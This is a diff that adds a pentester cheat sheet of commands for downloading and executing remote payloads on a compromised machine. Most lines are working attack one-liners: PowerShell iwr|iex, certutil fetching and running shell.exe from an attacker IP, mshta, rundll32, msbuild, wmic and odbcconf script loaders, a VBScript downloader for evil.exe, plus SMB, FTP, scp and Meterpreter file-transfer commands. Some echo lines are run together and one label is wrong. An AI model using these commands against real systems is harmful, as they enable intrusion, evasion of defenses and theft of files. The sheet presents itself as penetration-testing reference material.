@@ -1,0 +1,98 @@
+##Download remote payload and execute arbitrary code / The Pentester cheat sheet
+##Transfer files or payloads to be executed on a compromised machine is an accustomed action.
+
+##All following methods are helpfully in penetration testing and also used for general purpose.
+
+**Powershell**
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex" 
+
+**bitsadmin.exe**
+bitsadmin  /transfer mydownloadjob  /download  /priority normal  ^http://example.com/filename.zip  C:\Users\username\Downloads\filename.zip
+
+**certutil.exe**
+certutil -urlcache -split -f http://AttackerIP/shell.exe c:\Temp\shell.exe && C:\temp\shell.exe
+
+**mshta**
+mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+
+**Rundll32**
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+
+**Msbuild**
+cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
+
+**Cscript/Wscript**
+cscript //E:jscript \\webdavserver\folder\payload.txt
+
+**VbScript wget.vbs**
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs 
+echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs 
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
+echo http.Open "GET",strURL,False >> wget.vbs echo http.Send >> wget.vbs 
+echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs 
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs echo strData = "" >> wget.vbs 
+echo strBuffer = "" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs 
+echo Next >> wget.vbs echo ts.Close >> wget.vbs
+Interact with the script
+cscript wget.vbs http://attackerIP/evil.exe evil.exe
+Wmic
+wmic os get /format:"https://webserver/payload.xsl"
+Odbcconf
+odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
+Process performing network call: svchost.exe
+Payload written on disk: WebDAV client local cache
+
+**SMB**
+smbclient //server/share -c 'cd c:/remote/path ; put local-file remote-file'
+
+**PUT http method (if enabled )**
+curl -T filename.txt http://www.example.com/dir/
+
+**SSH File Transfer**
+cat file | ssh user@192.168.0.12 "cat > /path/file"
+
+**SCP File Transfer**
+scp scp.txt user@192.168.1.11:~/
+
+**FTP**
+ftp -n <<EOF
+open 192.168.0.10
+user anonymous aaa
+binary
+put $1
+EOF
+- download file
+curl -T my-local-file.txt ftp://ftp.example.com --user user:secret
+
+**Python server**
+**Fire-up python HTTP server**
+python -m SimpleHTTPServer
+
+**On the target machine download the file**
+wget http://192.168.1.11/fileDownload
+
+**Pyftpdlib (Lightweight FTP server)**
+python -m pyftpdlib -p PORT -u USERNAME -p PASSWORD 
+
+**SMB**
+**Starting the server**
+impacket-smbserver.py shareName sharePath
+
+**In the windows machine**
+C:\>net use /d \\[host]\[share name]
+
+**FreeBSD OS - Fetch instead wget**
+fetch -oq fileName https://192.168.1.11/fileName
+
+**Download file through Meterpreter**
+meterpreter> download file.txt /root/Desktop
